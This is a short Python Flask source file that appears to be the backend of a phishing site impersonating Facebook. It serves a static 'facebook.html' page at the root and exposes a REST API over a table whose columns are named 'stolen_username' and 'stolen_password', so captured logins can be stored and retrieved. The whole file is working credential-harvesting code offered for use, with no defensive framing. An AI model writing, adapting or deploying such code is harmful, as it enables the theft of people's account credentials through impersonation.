from flask import Flask
from flask_restless import APIManager
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import Column, Integer, Text

app = Flask(__name__, static_url_path='')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True
db = SQLAlchemy(app)


class User(db.Model):
    id = Column(Integer, primary_key=True)
    stolen_username = Column(Text, unique=False)
    stolen_password = Column(Text, unique=False)


db.create_all()

api_manager = APIManager(app, flask_sqlalchemy_db=db)
api_manager.create_api(User, methods=['GET', 'POST', 'DEL', 'PUT'])


@app.route("/")
def login():
    return app.send_static_file("facebook.html")

app.debug = True

if __name__ == '__main__':
    app.run()
